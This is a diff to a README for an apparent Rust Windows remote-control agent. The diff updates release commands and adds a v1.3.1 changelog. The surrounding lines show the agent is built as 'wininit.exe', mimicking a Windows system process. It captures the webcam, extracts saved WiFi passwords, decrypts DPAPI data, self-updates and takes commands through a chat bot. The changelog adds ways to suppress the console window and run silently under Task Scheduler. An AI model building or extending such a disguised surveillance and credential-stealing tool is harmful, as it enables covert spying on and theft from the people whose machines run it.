@@ -102,12 +102,12 @@ Agent tự động kiểm tra version từ GitHub khi daemon start:
 ```bash
 # 1. Bump version trong Cargo.toml
 # 2. Commit + push
-git add -A && git commit -m "release: v1.3.0" && git push
+git add -A && git commit -m "release: v1.3.1" && git push
 
 # 3. Tag + push tag
-git tag v1.3.0 && git push origin v1.3.0
+git tag v1.3.1 && git push origin v1.3.1
 
-# → GitHub Actions tự build + tạo release v1.3.0 với wininit.exe
+# → GitHub Actions tự build + tạo release v1.3.1 với wininit.exe
 # → Agent đang chạy sẽ tự update khi restart
 ```
 
@@ -245,7 +245,7 @@ src/
 │   ├── camera.rs     # Webcam capture
 │   ├── wallpaper.rs  # Desktop wallpaper
 │   ├── wifi.rs       # Saved WiFi + passwords
-│   ├── audio.rs      # mute, unmute, volume (PowerShell)
+│   ├── audio.rs      # mute, unmute, volume (Win32 FFI)
 │   └── msgbox.rs     # MessageBox Win32
 ├── security/
 │   ├── dpapi.rs      # CryptProtectData / CryptUnprotectData
@@ -281,6 +281,29 @@ src/
 | anyhow 1.0 | Error handling |
 
 ## Changelog
+
+### v1.3.1
+
+**Console & startup:**
+- Use `#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]` — release builds are Windows GUI apps, no console window created
+- `AttachConsole(ATTACH_PARENT_PROCESS)` at startup — reattaches to cmd.exe when run from terminal, no-op when run via Task Scheduler
+- Removed `FreeConsole()` hack — no longer needed with Windows subsystem
+
+**Logging:**
+- Log flushes immediately after each write — logs appear in real-time, not just on buffer full
+
+**Audio:**
+- Replaced PowerShell + C# COM with native Win32 FFI:
+  - `/volume` → `waveOutSetVolume` (winmm.dll) — ~100x faster
+  - `/mute`, `/unmute` → `SendInput` + `VK_VOLUME_MUTE` — ~50x faster
+- Added `Win32_Media_Audio`, `Win32_UI_Input_KeyboardAndMouse`, `Win32_System_Console` features
+
+**Location:**
+- Check `status` field from ip-api.com response — proper error handling for API failures
+- Use HTTP instead of HTTPS (ip-api.com free tier)
+
+**Command logging:**
+- New `log_command()` in router — audit trail: `CMD /screenshot from @user (uid=X, chat=Y)`
 
 ### v1.3.0
 
